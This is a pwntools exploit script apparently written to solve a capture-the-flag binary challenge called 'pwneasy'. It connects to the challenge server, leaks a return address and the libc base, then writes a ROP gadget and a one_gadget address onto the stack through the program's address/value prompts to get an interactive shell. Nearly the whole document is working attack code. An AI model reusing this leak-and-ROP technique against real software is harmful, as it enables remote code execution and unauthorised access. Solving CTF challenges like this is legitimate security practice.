#!/usr/bin/env python3

from pwn import *

exe = ELF("./pwneasy")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.37.so")

context.binary = exe

r = None

def conn():
    global r
    if args.LOCAL:
        #r = process([exe.path])
        r = process([ld.path, exe.path], env={"LD_PRELOAD": libc.path}) #if patched binary does not work - exe is original one
        if args.PLT_DEBUG:
            gdb.attach(r)
    else:
        r = remote("easy_pwneasy.zajebistyc.tf", 8010)
        #r = remote("127.0.0.1", 4000)

def main():
    conn()
    # good luck pwning :)

    r.recvuntil(b"give me address: ")
    r.send(b"\x01" * 0x18)
    r.recvuntil(b"give me value: ")
    r.send(0x18 * b"\x02") #last byte is 0x00 so we overwrite it

    resp = r.recvline()
    print(resp)
    ret_leak = u64(resp[0x1b:0x21] + b"\x00\x00") + 0x8
    libc_base = u64(resp[0x3c:0x42] + b"\x00\x00") - 0x8465d
    print(f"Ret addr @ {hex(ret_leak)}")
    print(f"Heap leak @ {hex(libc_base)}")

    #r.interactive()
    #xor_ecx = 0x0013a280#: xor ecx, ecx; mov rax, rcx; ret;
    #xor_ecx = 0x0016542b#: xor ecx, ecx; cmp rax, 1; sete cl; add rsp, 8; mov eax, ecx; ret;

    #xor_ebx = 0x000cf30e#: xor ebx, ebx; mov rax, rbx; pop rbx; ret;
    xor_ebx = 0x111c91#: xchg ebx, eax; idiv edi; mov rax, [rsp]; add rsp, 0x28; ret;

    one_gadget = 0x4e8a0

    #We need to get our ropchain on ret + 0x10 (so we can reuse main gadget)
    print(f"XOR_Gadget @ {hex(libc_base + xor_ebx)}")

    input("WAIT")
    addr_dict = {ret_leak + 0x10:libc_base + xor_ebx,
                 ret_leak + 0x40:libc_base + one_gadget}

    for k,v in addr_dict.items():
        r.recvuntil(b"give me address: ")
        r.send(str(int(k)).encode() + b" " + b"CCCCCCCC")
        r.recvuntil(b"give me value: ")
        r.send(str(int(v)).encode())

        resp = r.recvline()
        print(resp)

    #print(resp.split(b" OK"))
    #libc_leak = u64(resp.split(b" ")[2] + b"\x00\x00")
    #print("Libc @ {libc_leak}")
    r.interactive()


if __name__ == "__main__":
    main()
